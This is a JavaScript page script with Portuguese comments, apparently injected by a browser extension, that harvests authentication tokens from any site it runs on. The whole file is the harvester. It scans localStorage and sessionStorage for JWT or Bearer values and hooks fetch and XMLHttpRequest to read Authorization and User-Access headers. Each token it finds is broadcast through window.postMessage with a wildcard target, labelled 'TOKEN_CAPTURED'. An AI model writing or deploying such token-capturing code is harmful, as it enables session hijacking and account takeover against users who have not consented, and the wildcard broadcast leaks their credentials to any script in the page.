// Roda dentro do contexto da página — intercepta fetch e XHR de qualquer sistema
(function () {
  // ─── Varre localStorage e sessionStorage ao carregar ────────────────────────
  function varrerStorage() {
    const storages = [localStorage, sessionStorage];
    const authKeys = /auth|token|bearer|access.?token|user.?access/i;
    let auth = '', ua = '';

    for (const store of storages) {
      try {
        for (let i = 0; i < store.length; i++) {
          const key = store.key(i);
          if (!authKeys.test(key)) continue;
          const val = store.getItem(key) || '';
          // Se o valor parece um JWT ou Bearer token
          if (/^(Bearer\s+)?[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+/.test(val) ||
              /^Bearer\s+\S+/.test(val)) {
            if (!auth) auth = val.startsWith('Bearer') ? val : 'Bearer ' + val;
          }
          if (/user.?access/i.test(key) && !ua) ua = val;
        }
      } catch {}
    }

    if (auth) enviar(auth, ua, window.location.href);
  }

  function enviar(auth, ua, url) {
    if (!auth) return;
    window.postMessage({
      type:          'TOKEN_CAPTURED',
      authorization: auth,
      userAccess:    ua,
      sourceUrl:     url
    }, '*');
  }

  // ─── Intercepta fetch ────────────────────────────────────────────────────────
  const origFetch = window.fetch;
  window.fetch = function (url, opts) {
    const h = (opts && opts.headers) || {};
    let auth = '', ua = '';
    if (h instanceof Headers) {
      auth = h.get('Authorization') || h.get('authorization') || '';
      ua   = h.get('User-Access')   || h.get('user-access')   || '';
    } else {
      auth = h['Authorization'] || h['authorization'] || '';
      ua   = h['User-Access']   || h['user-access']   || '';
    }
    if (auth) enviar(auth, ua, String(url));
    return origFetch.apply(this, arguments);
  };

  // ─── Intercepta XMLHttpRequest ───────────────────────────────────────────────
  const origOpen      = XMLHttpRequest.prototype.open;
  const origSetHeader = XMLHttpRequest.prototype.setRequestHeader;
  const origSend      = XMLHttpRequest.prototype.send;

  XMLHttpRequest.prototype.open = function (m, url) {
    this._captureUrl     = String(url || '');
    this._captureHeaders = {};
    return origOpen.apply(this, arguments);
  };

  XMLHttpRequest.prototype.setRequestHeader = function (name, value) {
    if (this._captureHeaders) this._captureHeaders[name] = value;
    return origSetHeader.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function () {
    const h    = this._captureHeaders || {};
    const auth = h['Authorization'] || h['authorization'] || '';
    const ua   = h['User-Access']   || h['user-access']   || '';
    if (auth) enviar(auth, ua, this._captureUrl || '');
    return origSend.apply(this, arguments);
  };

  // Varre storage ao carregar (captura imediata se o token já estiver salvo)
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', varrerStorage);
  } else {
    varrerStorage();
  }
})();
